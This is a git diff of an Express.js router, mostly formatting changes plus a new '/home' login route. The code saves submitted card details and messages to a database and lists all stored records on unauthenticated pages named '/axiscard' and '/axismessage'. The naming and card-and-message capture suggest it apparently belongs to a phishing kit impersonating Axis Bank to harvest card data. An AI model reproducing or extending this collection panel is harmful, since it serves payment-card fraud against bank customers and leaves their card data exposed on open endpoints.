@@ -4,16 +4,19 @@ const CardModal = require('../models/CardData')
 const MessageModal = require('../models/MessageData')
 
 /* GET home page. */
-router.get('/', function(req, res, next) {
+router.get('/', function (req, res, next) {
   res.render('index', { title: 'Home' });
 });
-router.get('/form', function(req, res, next) {
+router.get('/home', function (req, res, next) {
+  res.render('loginHome', { title: 'homelogin' });
+});
+router.get('/form', function (req, res, next) {
   res.render('form', { title: 'Form' });
 });
-router.get('/options', function(req, res, next) {
+router.get('/options', function (req, res, next) {
   res.render('option', { title: 'Options' });
 });
-router.post('/card', async function(req, res, next) {
+router.post('/card', async function (req, res, next) {
   try {
     var userDetails = new CardModal({
       name: req.body.name,
@@ -38,7 +41,7 @@ router.post('/card', async function(req, res, next) {
   res.render('success')
 });
 
-router.post('/message', async (req, res)=>{
+router.post('/message', async (req, res) => {
   try {
     var userDetails = new MessageModal({
       message: req.body.message,
@@ -51,13 +54,13 @@ router.post('/message', async (req, res)=>{
   res.send('message got success')
 })
 
-router.get("/axiscard", async (req, res)=>{
-  let cardData = await CardModal.find().sort({createdAt: -1});
-  res.render("card", {cardData})
+router.get("/axiscard", async (req, res) => {
+  let cardData = await CardModal.find().sort({ createdAt: -1 });
+  res.render("card", { cardData })
 })
-router.get("/axismessage", async (req, res)=>{
-  let cardData = await MessageModal.find().sort({createdAt: -1});
-  res.render("message", {cardData})
+router.get("/axismessage", async (req, res) => {
+  let cardData = await MessageModal.find().sort({ createdAt: -1 });
+  res.render("message", { cardData })
 })
 
 module.exports = router;
